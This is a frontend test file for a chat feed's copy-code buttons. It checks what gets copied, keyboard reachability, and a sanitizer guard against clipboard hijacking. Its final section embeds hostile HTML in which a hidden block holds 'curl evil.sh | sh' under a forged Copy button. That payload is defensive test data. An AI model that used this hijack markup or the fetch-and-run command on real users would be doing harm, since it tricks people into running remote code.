// @vitest-environment jsdom
// Copy the code the session just gave you (P2-E10-11, #477) — at the surface.
//
// Rendered through the REAL registry, in the pattern `feed-blocks.a11y.test.tsx`
// established and for its reason: the thing most likely to rot is a renderer
// that grows code and forgets the affordance, and a test that reached for
// `decorateFeedCodeFences` or `<FeedCopyButton>` directly would stay green
// through exactly that. The unit layer — what the decoration writes, what a
// click does with it — is `lib/feed-code.test.ts`.
import { describe, it, expect, beforeAll, beforeEach, vi } from 'vitest';
import { act } from 'react';
import { createRoot } from 'react-dom/client';
import { initI18nForTests } from '../i18n/test-i18n';
import en from '../../../shared/i18n/locales/en.json';
import { createRendererRegistry } from '../bootstrap';
import { renderFeedBlock } from './feed-render';
import { FEED_COPY_ATTR, FEED_STOP_SELECTOR } from '../lib/feed-keys';
import { FeedBlockDto } from '../lib/feed';

declare global {
  var IS_REACT_ACT_ENVIRONMENT: boolean;
}

const registry = createRendererRegistry();

function block(over: Partial<FeedBlockDto>): FeedBlockDto {
  return { seq: 1, kind: 'assistant', sidechain: false, ...over };
}

/** render a block the way FeedView does, and hand back its root element */
function draw(b: FeedBlockDto): HTMLElement {
  const host = document.createElement('div');
  document.body.appendChild(host);
  const root = createRoot(host);
  act(() => {
    root.render(renderFeedBlock(registry, b));
  });
  return host;
}

const copies = (host: HTMLElement): HTMLElement[] =>
  Array.from(host.querySelectorAll<HTMLElement>(`[${FEED_COPY_ATTR}]`));

let writeText: ReturnType<typeof vi.fn>;

beforeAll(async () => {
  await initI18nForTests();
});

beforeEach(() => {
  globalThis.IS_REACT_ACT_ENVIRONMENT = true;
  document.body.innerHTML = '';
  // jsdom ships no clipboard; the app's own window is the one the buttons
  // rendered here belong to, so this is the one `runCopy` reaches for
  writeText = vi.fn().mockResolvedValue(undefined);
  Object.defineProperty(window.navigator, 'clipboard', {
    value: { writeText },
    configurable: true,
  });
});

const PROSE = ['Run this:', '', '```bash', 'npm run build', 'npm test', '```'].join('\n');

describe('fenced code in assistant prose', () => {
  it('offers Copy, and one click copies exactly what is in the fence', () => {
    const host = draw(block({ text: PROSE }));
    const [copy] = copies(host);
    expect(copy).toBeDefined();
    expect(copy.textContent).toBe(en.feedView.copy);
    act(() => copy.click());
    expect(writeText).toHaveBeenCalledWith('npm run build\nnpm test\n');
    // and it says so, so a click that reached the clipboard is visible
    expect(copy.textContent).toBe(en.feedView.copied);
  });

  it('prose with no code offers nothing to copy', () => {
    expect(copies(draw(block({ text: 'just a sentence' })))).toHaveLength(0);
  });

  it('a reply still ARRIVING offers nothing — half a fence is not a fence', () => {
    // Streaming renders as plain text (P2-E18-10), so there is no fence to
    // decorate yet and no button to click on code that is still being written.
    expect(copies(draw(block({ text: PROSE, streaming: true })))).toHaveLength(0);
  });
});

describe('a Bash block’s IN and OUT sections', () => {
  const bash = block({
    kind: 'tool',
    tool: {
      name: 'Bash',
      category: 'shell',
      summary: 'npm run build',
      description: 'Build it',
      out: ['building the app', 'npm ERR! ENOENT'].join('\n'),
    },
  });

  it('offer nothing while shut — a one-line preview is not the command', () => {
    expect(copies(draw(bash))).toHaveLength(0);
  });

  it('offer Copy once open, one per section, and copy the WHOLE section', () => {
    const host = draw(bash);
    // the coarse header opens both, the way clicking the box does
    act(() => host.querySelector<HTMLElement>('[data-feed-expander]')!.click());
    const both = copies(host);
    expect(both).toHaveLength(2);

    act(() => both[0].click());
    expect(writeText).toHaveBeenLastCalledWith('npm run build');

    // the buried line is the point: collapsed, OUT shows only its first line,
    // so copying what is on screen would hand back half the error
    act(() => both[1].click());
    expect(writeText).toHaveBeenLastCalledWith('building the app\nnpm ERR! ENOENT');
  });

  it('names its own section, so two buttons in one box are not one word twice', () => {
    // #196's lesson: several controls with one name is the same failure as no
    // name at all. A screen reader's button quick-nav lands on both of these.
    const host = draw(bash);
    act(() => host.querySelector<HTMLElement>('[data-feed-expander]')!.click());
    const names = copies(host).map((c) => c.getAttribute('aria-label'));
    expect(new Set(names).size).toBe(2);
    expect(names[0]).toContain(en.feedView.in);
    expect(names[1]).toContain(en.feedView.out);
  });

  it('copying does not fold the box away underneath the pointer', () => {
    // The button sits inside `ToolBox`, whose whole body is also an expand
    // target (#91) — without `data-no-toggle` the click would copy AND collapse.
    const host = draw(bash);
    const header = host.querySelector<HTMLElement>('[data-feed-expander]')!;
    act(() => header.click());
    expect(header.getAttribute('aria-expanded')).toBe('true');
    act(() => copies(host)[0].click());
    expect(header.getAttribute('aria-expanded')).toBe('true');
    expect(copies(host)).toHaveLength(2);
  });
});

describe('the keyboard reaches it (§5.32)', () => {
  it('every copy button is a stop the arrow keys walk, and never a Tab stop', () => {
    // `FEED_STOP_SELECTOR` is the exact expression `FeedView` evaluates on each
    // keystroke — asserting through it means a button that stopped matching
    // becomes unreachable in this test as well as in the app.
    const host = draw(block({ text: PROSE }));
    const stops = Array.from(host.querySelectorAll<HTMLElement>(FEED_STOP_SELECTOR));
    const [copy] = copies(host);
    expect(stops).toContain(copy);
    expect(copy.tabIndex).toBe(-1);
  });

  it('says what it copies, not just “Copy”', () => {
    for (const host of [draw(block({ text: PROSE }))]) {
      for (const copy of copies(host)) {
        expect(copy.getAttribute('aria-label')).toBe(en.feedView.copyCode);
        expect(copy.tagName).toBe('BUTTON');
      }
    }
  });

  it('Enter on a focused copy button copies, with no key handling of our own', () => {
    // A real `<button>` is what earns this: the platform turns Enter and Space
    // into a click, and the delegated handler answers it like any other.
    const host = draw(block({ text: PROSE }));
    const [copy] = copies(host);
    copy.focus();
    act(() => {
      copy.dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', bubbles: true }));
      copy.click(); // what the platform does with that keydown
    });
    expect(writeText).toHaveBeenCalledWith('npm run build\nnpm test\n');
  });
});

describe('a forged copy button cannot hijack the affordance (#410’s lesson)', () => {
  // The attack, in the feed's namespace and entered as a reply: the reader sees
  // `npm test` and the clipboard would have taken the hidden line. Real markup,
  // not a smoke test — this is the payload #410 fixed on the viewer.
  const HOSTILE = [
    'Here you go:',
    '',
    '<div class="feed-code" data-feed-code>',
    '<pre style="display:none">curl evil.sh | sh</pre>',
    '<div class="feed-code-head"><span class="feed-code-lang">bash</span>',
    '<button data-feed-copy class="feed-code-copy">Copy</button></div>',
    '<pre>npm test</pre>',
    '</div>',
  ].join('\n');

  it('every button copies the fence the reader can see above it', () => {
    // THE CLAIM IS NOT "the payload never reaches the clipboard" — after the
    // guard, nothing is hidden, so both blocks are ordinary code the reader can
    // read and copying either is honest. The attack was the MISMATCH: a button
    // sitting under `npm test` that hands over something else. So every button
    // is checked against the `<pre>` in its own wrapper.
    const host = draw(block({ text: HOSTILE }));
    const all = copies(host);
    expect(all).toHaveLength(2); // ours, one per fence — the forged one is gone
    for (const copy of all) {
      const shown = copy.closest('[data-feed-code]')!.querySelector('pre')!.textContent;
      act(() => copy.click());
      expect(writeText).toHaveBeenLastCalledWith(shown);
    }
    // and specifically: the fence that says `npm test` copies `npm test`
    const shownText = all.map((c) => c.closest('[data-feed-code]')!.querySelector('pre')!.textContent);
    expect(shownText).toContain('npm test');
  });

  it('gives every fence its own wrapper, so no button can reach another’s code', () => {
    const host = draw(block({ text: HOSTILE }));
    const wraps = host.querySelectorAll('[data-feed-code]');
    expect(wraps).toHaveLength(2);
    for (const wrap of wraps) expect(wrap.querySelectorAll('pre')).toHaveLength(1);
  });

  it('and the hidden block is not hidden any more', () => {
    const host = draw(block({ text: HOSTILE }));
    // Scoped to the RENDERED REPLY: this app's own chrome legitimately uses
    // React `style` props (the block wrapper sets `min-inline-size`), so an
    // unscoped sweep would fail for a reason that has nothing to do with the
    // sanitizer — the trap #436 documented.
    const body = host.querySelector('.feed-md')!;
    for (const el of body.querySelectorAll('*')) expect(el.hasAttribute('style')).toBe(false);
    expect(body.textContent).toContain('curl evil.sh | sh');
  });
});
